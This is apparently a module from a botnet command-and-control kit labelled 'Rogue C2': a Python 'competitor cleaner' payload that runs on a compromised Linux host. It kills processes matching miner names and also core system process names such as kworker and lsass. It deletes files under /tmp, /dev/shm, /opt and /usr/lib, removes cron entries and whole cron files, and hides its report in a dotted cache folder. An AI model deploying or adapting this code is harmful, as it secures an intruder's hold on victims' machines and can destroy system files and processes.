#!/usr/bin/env python3
"""
PAYLOAD: Competitor/Malware Cleaner
DESCRIPTION: Remove other botnets/malware from system
AUTHOR: Rogue Red Team
VERSION: 1.0
"""
import os, re, subprocess, json, time, hashlib, psutil, shutil
from datetime import datetime

class CompetitorCleaner:
    def __init__(self):
        self.removed_items = []
        self.suspicious_patterns = {
            'process_names': [
                'minerd', 'cpuminer', 'xmrig', 'ccminer', 'ethminer',
                'javaupd', 'javaw', 'svchost', 'lsass', 'smss',
                'systemd-network', 'systemd-resolve',
                'kthreadd', 'kworker', 'migration',
            ],
            'file_paths': [
                '/tmp/.*\.sh', '/dev/shm/.*',
                '/var/tmp/.*', '/tmp/.*\.elf',
                '\.cache/.*miner', '\.config/.*bot',
                '/opt/.*malware', '/usr/lib/.*backdoor',
            ],
            'network_ports': [
                3333, 4444, 5555, 6666, 7777, 8888, 9999,
                13333, 14444, 15555, 16666, 17777, 18888, 19999,
                33333, 44444, 55555, 66666, 77777, 88888, 99999,
            ],
            'cron_patterns': [
                r'curl.*\|.*sh',
                r'wget.*-O.*\.sh',
                r'python.*http',
                r'perl.*-e',
                r'bash.*<\(curl',
                r'base64.*decode',
            ]
        }
    
    def scan_processes(self):
        """Scan for suspicious processes"""
        suspicious = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username']):
            try:
                pinfo = proc.info
                cmdline = ' '.join(pinfo['cmdline']) if pinfo['cmdline'] else ''
                
                # Check process name patterns
                for pattern in self.suspicious_patterns['process_names']:
                    if re.search(pattern, pinfo['name'], re.I) or re.search(pattern, cmdline, re.I):
                        suspicious.append({
                            'pid': pinfo['pid'],
                            'name': pinfo['name'],
                            'cmdline': cmdline[:200],
                            'user': pinfo['username'],
                            'reason': f'Matches pattern: {pattern}'
                        })
                        break
                
                # Check for crypto miners
                miner_keywords = ['miner', 'pool', 'stratum', 'hashrate', 'xmrig', 'cpuminer']
                if any(keyword in cmdline.lower() for keyword in miner_keywords):
                    suspicious.append({
                        'pid': pinfo['pid'],
                        'name': pinfo['name'],
                        'cmdline': cmdline[:200],
                        'user': pinfo['username'],
                        'reason': 'Crypto miner detected'
                    })
                
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return suspicious
    
    def scan_filesystem(self, paths=None):
        """Scan for suspicious files"""
        if not paths:
            paths = ['/tmp', '/dev/shm', '/var/tmp', os.path.expanduser('~/.cache'), 
                    os.path.expanduser('~/.config'), '/opt', '/usr/lib']
        
        suspicious_files = []
        
        for scan_path in paths:
            if os.path.exists(scan_path):
                for root, dirs, files in os.walk(scan_path):
                    for file in files:
                        filepath = os.path.join(root, file)
                        
                        # Check against patterns
                        for pattern in self.suspicious_patterns['file_paths']:
                            if re.search(pattern, filepath):
                                suspicious_files.append({
                                    'path': filepath,
                                    'reason': f'Matches pattern: {pattern}'
                                })
                                break
                        
                        # Check file extensions
                        suspicious_exts = ['.miner', '.bot', '.malware', '.backdoor', '.crypt']
                        if any(filepath.endswith(ext) for ext in suspicious_exts):
                            suspicious_files.append({
                                'path': filepath,
                                'reason': 'Suspicious extension'
                            })
        
        return suspicious_files
    
    def scan_cron_jobs(self):
        """Scan for suspicious cron jobs"""
        suspicious_crons = []
        
        try:
            # Check user crontab
            output = subprocess.check_output("crontab -l 2>/dev/null || echo ''", shell=True).decode()
            
            for pattern in self.suspicious_patterns['cron_patterns']:
                matches = re.findall(pattern, output, re.I)
                for match in matches:
                    suspicious_crons.append({
                        'source': 'user_crontab',
                        'entry': match,
                        'reason': f'Matches pattern: {pattern}'
                    })
            
            # Check system cron directories
            cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.monthly', '/etc/cron.weekly']
            for cron_dir in cron_dirs:
                if os.path.exists(cron_dir):
                    for root, dirs, files in os.walk(cron_dir):
                        for file in files:
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'r') as f:
                                    content = f.read()
                                    for pattern in self.suspicious_patterns['cron_patterns']:
                                        matches = re.findall(pattern, content, re.I)
                                        for match in matches:
                                            suspicious_crons.append({
                                                'source': filepath,
                                                'entry': match,
                                                'reason': f'Matches pattern: {pattern}'
                                            })
                            except:
                                pass
        
        except Exception as e:
            print(f"[!] Error scanning cron jobs: {e}")
        
        return suspicious_crons
    
    def remove_suspicious_items(self, processes, files, crons):
        """Remove detected suspicious items"""
        removed = []
        
        # Kill suspicious processes
        for proc in processes:
            try:
                os.kill(proc['pid'], 9)
                removed.append({
                    'type': 'process',
                    'pid': proc['pid'],
                    'name': proc['name'],
                    'reason': proc['reason']
                })
                print(f"[+] Killed process: {proc['name']} (PID: {proc['pid']})")
            except Exception as e:
                print(f"[!] Failed to kill process {proc['name']}: {e}")
        
        # Remove suspicious files
        for file_info in files:
            try:
                if os.path.exists(file_info['path']):
                    os.remove(file_info['path'])
                    removed.append({
                        'type': 'file',
                        'path': file_info['path'],
                        'reason': file_info['reason']
                    })
                    print(f"[+] Removed file: {file_info['path']}")
            except Exception as e:
                print(f"[!] Failed to remove file {file_info['path']}: {e}")
        
        # Clean suspicious cron jobs
        for cron in crons:
            try:
                if cron['source'] == 'user_crontab':
                    # Clean user crontab
                    output = subprocess.check_output("crontab -l 2>/dev/null || echo ''", shell=True).decode()
                    lines = output.split('\n')
                    new_lines = [line for line in lines if cron['entry'] not in line]
                    
                    if len(new_lines) != len(lines):
                        subprocess.call('echo "" | crontab -', shell=True)
                        if new_lines:
                            crontab_content = '\n'.join(new_lines)
                            subprocess.call(f'echo "{crontab_content}" | crontab -', shell=True)
                        
                        removed.append({
                            'type': 'cron',
                            'source': cron['source'],
                            'entry': cron['entry'],
                            'reason': cron['reason']
                        })
                        print(f"[+] Removed cron entry: {cron['entry']}")
                else:
                    # Remove suspicious cron file
                    if os.path.exists(cron['source']):
                        os.remove(cron['source'])
                        removed.append({
                            'type': 'cron_file',
                            'path': cron['source'],
                            'reason': cron['reason']
                        })
                        print(f"[+] Removed cron file: {cron['source']}")
            except Exception as e:
                print(f"[!] Failed to clean cron: {e}")
        
        return removed
    
    def execute(self):
        """Execute competitor cleaning"""
        try:
            print("[+] Starting competitor/malware cleanup...")
            
            # Scan for threats
            print("[*] Scanning for suspicious processes...")
            processes = self.scan_processes()
            print(f"[*] Found {len(processes)} suspicious processes")
            
            print("[*] Scanning for suspicious files...")
            files = self.scan_filesystem()
            print(f"[*] Found {len(files)} suspicious files")
            
            print("[*] Scanning for suspicious cron jobs...")
            crons = self.scan_cron_jobs()
            print(f"[*] Found {len(crons)} suspicious cron entries")
            
            # Remove threats
            if processes or files or crons:
                removed = self.remove_suspicious_items(processes, files, crons)
                self.removed_items = removed
                
                # Save removal report
                report = {
                    'timestamp': datetime.now().isoformat(),
                    'removed_items': removed,
                    'total_removed': len(removed)
                }
                
                report_file = os.path.expanduser("~/.cache/.rogue/competitor_cleanup.json")
                os.makedirs(os.path.dirname(report_file), exist_ok=True)
                
                with open(report_file, 'w') as f:
                    json.dump(report, f, indent=2)
                
                return f"[+] Cleanup complete: Removed {len(removed)} suspicious items"
            else:
                return "[*] No suspicious items found"
            
        except Exception as e:
            return f"[!] Competitor cleanup failed: {e}"

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    cleaner = CompetitorCleaner()
    return cleaner.execute()

if __name__ == "__main__":
    print(rogue_integration())
